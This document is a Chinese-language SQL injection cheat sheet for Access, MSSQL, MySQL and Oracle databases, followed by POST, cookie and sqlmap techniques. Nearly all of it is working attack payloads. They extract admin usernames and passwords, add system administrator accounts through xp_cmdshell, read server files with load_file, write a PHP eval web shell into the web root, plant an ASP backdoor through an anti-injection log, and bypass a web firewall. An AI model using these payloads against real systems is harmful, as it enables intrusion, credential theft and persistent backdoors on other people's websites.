#############################################################################
#########################	access 注入	 ############################
#############################################################################

'		如果被转码   有注入
and 1=1		如果返回正常 有注入
and 1=2 	如果返回错误 有注入
or  1=1		如果返回错误 有注入
or  1=2		如果返回正常 有注入

也就是说加上and或者or后面的sql语句必须是逻辑表达式，否则不能查询

如果有注入 继续判断
and exists(select * from [msysobjects] )>0  如果存在则为accsee数据库
and exists(select * from [sysobjects] )>0   如果存在则为sqlserver数据库

判断表
and exists(select * from [admin])		返回正常则存在admin表
and exists(select * from [users])		返回正常则存在users表

判断字段
and exists(select [admin] from [admin])	返回正常则存在admin字段名
and exists(select [password] from [admin])	返回正常则存在password字段名

判断字段长度
order by 10		如果正常则继续
order by 20		如果失败则继续
order by 15		二分法得出字段值长度 以此类推

得到字段长度后（假设为13）
and 1=2 union (select 1,2,3,4,5,6,7,8,9,10,11,12,13 from admin)
在页面可以获得两个值
3和12

and 1=2 union (select 1,2,admin,4,5,6,7,8,9,10,11,password,13) 或者
and 1=2 union (select 1,2,password,4,5,6,7,8,9,10,11,admin,13)

然后可以爆出管理员用户名和密码

另一种拆解方法：（也是利用二分法）
1.获取长度
and (select len(admin) from admin)=5  直接判断admin字段值长度
and (select len(password) from admin)=10 直接判断密码长度

2.拆解值利用asci码
拆解第一个字符
and (select top 1 asc(mid(admin,1,1))from admin)>100  不正常继续
and (select top 1 asc(mid(admin,1,1))from admin)=97   假如正常那么第一个字母就是a

拆解第二个字符
and (select top 1 asc(mid(admin,2,1))from admin)>100 

以此类推
3.偏移注入：假设已经知道字段长度为18 且页面已经捕获3和15两个字段位
and 1=2 union (select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin) 从22开始依次向前用*代替如
and 1=2 union (select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,*  from admin) 如果页面返回错误继续向前替换
and 1=2 union (select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from admin)     一直持续到页面又返回捕获两个字段的页面
将变量K=16，变量K为还原位，因为到16后面的17用*代替后返回到捕捉页

记字段长度为L，还原位为K，还原位与字段长度差值为T，现在求偏移位O

T = L - K
L = O + n*T

这里的例子就是

T = 22 - 16 = 6
O = 22 - n*6
令n=2 则O=10
令n=3 则O=4

然后地址栏就可以写入
union (select 1,2,3,4,5,6,7,8,9,10,a.id,b.id,* from (admin as a inner join admin as b on a.id = b.id))
union (select 1,2,3,4,a.id,b.id,c.id,* from((admin as a inner join admin as b on a.id=b.id)inner join admin as c on a.id=c.id))
然后可以随机爆出其他字段的值

#############################################################################
#########################	mssql 注入	 ############################
#############################################################################

判断注入'
and 1=1
and 1=2

初步判断是否为mssql
and user > 0	
and (select count(*) from sysobjects)>0
and (select count(*) from msysobjects)>0

注入参数是字符
'and [查询条件] and ''='

搜索时没过滤参数
'and [查询条件] and '%25'='

猜表名
and (select count(*) from [表名])>0

猜字段
and (select count(字段) from [表名])>0

猜字段长度
and (select top 1 len(字段名) from [表名])>0

猜字段的ascii值(access)
and (select top 1 asc(mid(字段名,1,1)) from [表名])>0

猜字段的ascii值(mssql)
and (select top 1 unicode(substring(字段名,1,1)) from [表名])>0

测试权限结构
and 1=(select IS_SRVROLEMEMBER('sysadmin'));--
and 1=(select IS_SRVROLEMEMBER('serveradmin'));--
and 1=(select IS_SRVROLEMEMBER('setupadmin'));--
and 1=(select IS_SRVROLEMEMBER('securityadmin'));--
and 1=(select IS_SRVROLEMEMBER('diskadmin'));--
and 1=(select IS_SRVROLEMEMBER('bulkadmin'));--
and 1=(select IS_MEMBER('db_owner'));--

添加mssql 和系统的账户
exec master.dbo.sp_addlogin username;--
exec master.dbo.sp_password null,username,password;--
exec master.dbo.sp_addsrvrolemember sysadmin username;--
调用cmdshell创建用户 工作组:所有 过期时间:永不  密码可改:是 需要密码:是 激活:是 
exec master.dbo.xp_cmdshell 'net user username password /workstations:* /times:all /passwordchg:yes /passwordreq:yes /active:yes /add';--

exec master.dbo.xp_cmdshell 'net user username password /add';--
exec master.dbo.xp_cmdshell 'net localgroup administrators username /add';--

查看版本信息
and 1=(select @@version)

查看数据库
and 1=(select db_name())

获取第一个用户数据库
and 1=(select top 1 name from master ..sysdatabases where dbid>4)  //假如爆出'acublog'

获取下一个用户数据库
and 1=(select top 1 name from master ..sysdatabases where dbid>4 and name<>'acublog')


获取第一张表 
and 1=(select top 1 name from sysobjects where xtype='u')   //假如爆出是'threads'

获取下一张表
and 1=(select top 1 name from sysobjects where xtype='u' and name <> 'threads')


获取第一个字段
and 1=(select top 1 name from syscolumns where id =(select id from sysobjects where name = 'users'))  //假如爆出uname

获取下一个字段
and 1=(select top 1 name from syscolumns where id =(select id from sysobjects where name = 'users')and name <> 'uname') //假如爆出upass


获取第一个用户名
and 1=(select top 1 uname from users)

获取第一个用户对应的密码
and 1=(select top 1 upass from users)


#############################################################################
#########################	mysql 注入	 ############################
#############################################################################

mysql数据库不能通过url直接访问其值
因此需要通过函数来爆出其值

连接
<?php
$sql['type']='mysql';
$sql['host']='localhost';
$sql['user']='root';
$sql['pass']='123456';
$sql['name']='test';
$sql['char']='utf8';
?>



函数
system_user()	系统用户名
user()		用户名
current_user	当前用户名
session_user()	连接用户名
database()	数据库名
version()	软件版本
load_file()	转换进制
@@datadir	读取数据库路径
@@basedir	读取软件路径
@@version_compile_os	操作系统


  				
		
判断
and 1=1 
and 1=2 
order by 10	判断字段长度  //假如是4
and 1=2 union select 1,2,3,4 from information_schema.tables 爆出字段位置，然后利用函数爆出信息如下
or 1=1 union select 1,databases(),version(),4 from information_schema.tables  爆出数据库名和版本  //假如数据库是jian
or 1=1 union select 1,user(),@@version_compile_os,4 from information_schema.tables 爆出操作系统和用户名

获取表名
union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=小葵工具(jian,16进制) //假如表名是yzmember

获取列名
union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=小葵工具(yzmember,16进制)//假如爆出username password

获取列表值(0x5c表示斜杠格式输出)
union select 1,group_concat(username,0x5c,password),3,4 from yzmember

读文件
load_file()

示例:
and 1=2 union select 1,load_file('c:\\inetpub\\wwwroot\\mysql-sql\\inc\\set_sql.php'),2,3,4

and 1=2 union select 1,load_file(0x633A5C5C696E65747075625C5C777777726F6F745C5C6D7973716C2D73716C5C5C696E635C5C7365745F73716C2E706870),2,3,4

load_file(参数)	可以将php文件源码读取出来

参数格式要求：

1.填写路径时需要使用绝对路径，因此你需要获取网页根目录路径
2.如果是数字，不需要加单引号，字符需要加单引号
3.如果使用斜杠则以URL正斜杠的格式
4.如果使用反斜杠需要转义，也就是\\
5.填写数字必须是路径的十六进制


若不知道对方的网页根路径，如果对方系统是2003则可以使用下面获取
load_file('c:/windows/system32/inetsrv/metabase.xml')		\\获取源代码
load_file('c:\\windows\\system32\\inetsrv\\metabase.xml')	\\获取源代码

然后查看源代码搜索c:\inetpub\wwwroot\mysql-sql			\\获取根路径
拿到根路径后就可以继续使用load_file(根路径\文件.php)		\\继续爆出源码


写文件
into outfile '绝对路径'

示例:
and 1=2 union select 1,"<?php @eval($_POST['tname']);?>",3,4 into outfile 'C:/Inetpub/wwwroot/mysql-sql/muma.php'

<?php @eval($_POST['tname']);?>	是一句话木马,tname是登录口令，需要加双引号写入

第一次写入可能会报错
需要再访问以此就成功
写入成功后使用菜刀登录对应的木马文件


#############################################################################
#########################	oracle 注入	 ############################
#############################################################################

and 1=1
and 1=2

order by 1	//如果太少不可以使用这个方法

爆表
and (select count(*) from admin)<>0 //返回正常则有admin表

爆字段
and (select count(user) from admin)<>0  //返回正常则存在user字段

爆值长度
and (select count(*) from admin where length(user)>=5)=1 //返回正常则值长度为5

爆值
and (select count(*) from admin where ascii(substr(name,1,1))>=97)=1  //正常则第一个值是a
and (select count(*) from admin where ascii(substr(name,2,1))>=100)=1 //正常则第二个值是d

以此类推 
#############################################################################
#########################	post 注入	 ############################
#############################################################################
使用pangolin工具
在url输入的地方的旁边有个下拉表单选择loadFrom后会自动弹出loadfrom界面
在界面里输入url后点击parse即可获取页面内的POST方式的表单，点击下面的Load按钮
然后会自动将表单的参数用GET形式显示出来，但是仍然是POST提交，然后就可以注入了

点击GO -> SELECT ALL -> DATABASE -> TABLES

使用sqlmap工具
将网站的url填写进去，然后加--data "这里填写post的参数" 然后就可以开始检测注入了


#############################################################################
#########################	cookie 注入	 ############################
#############################################################################

使用cookie提交方式可以绕过安全狗进行sql注入

小技巧:如果你在URL里手工GET注入后发现有防注入，并且记录你的注入参数和IP地址
这时候你可以写一句话木马让防注入系统记录下来，比如注入参数里写（假如是asp页面）:
and 1=<%eval request('c')%>
然后就可以发现木马被写入进去，这时候只需要找到防注入的页面存放的位置既可以找到后门！
一般这个木马会写入到网页根目录下的conn.asp 可以使用菜刀尝试链接后门

工具一
使用pangolin选择cookie方式即可

工具二
使用tamper data抓cookie然后sqlmap注入

工具三
1.使用注入中转生成器
2.在注入键名里输入参数如id=
3.在注入的url里输入不带参数的url地址
4.来源页同上面一样
5.POST提交值把00改成注入页的id值即可
6.点击生成ASP
7.进入中转生成器的根目录
8.打开本地测试，然后在浏览器地址栏输入http://localhost/jmCook.asp?jmdcw=30
然后就可以开始注入了


#############################################################################
#########################	post 注入	 ############################
#############################################################################

#############################################################################
#########################	不同参数 注入	 ############################
#############################################################################


#############################################################################
#########################	sqlmap 注入	 ############################
#############################################################################

指定参数和url注入(参数就是sql查询的条件)
sqlmap -u "http://www.example.com/login.asp" --data "username=admin&passwd=abc123"

指定cookie和url注入(cookie可以通过tamper DATA 工具捕获)
sqlmap -u "http://www.example.com/login.asp" --cookie "Hereiscookie=123456"

假如上面检测出可以sql注入那么可以使用下面语句

1爆出当前使用的用户及密码
sqlmap -u "xxx" --cookie="xxx" --current-users  --passwords

2爆出当前使用数据库软件版本号和当前使用的数据库名
sqlmap -u "xxx" --cookie="xxx" --current-db  -b

3爆出指定数据的表名
sqlmap -u "xxx" --cookie="xxx" -D dbname --tables

4爆出指定表名的字段
sqlmap -u "xxx" --cookie="xxx" -T tablename --columns

5爆出指定字段的值
sqlmap -u "xxx" --cookie="xxx" -T tablename -C user,passwd --dump


 



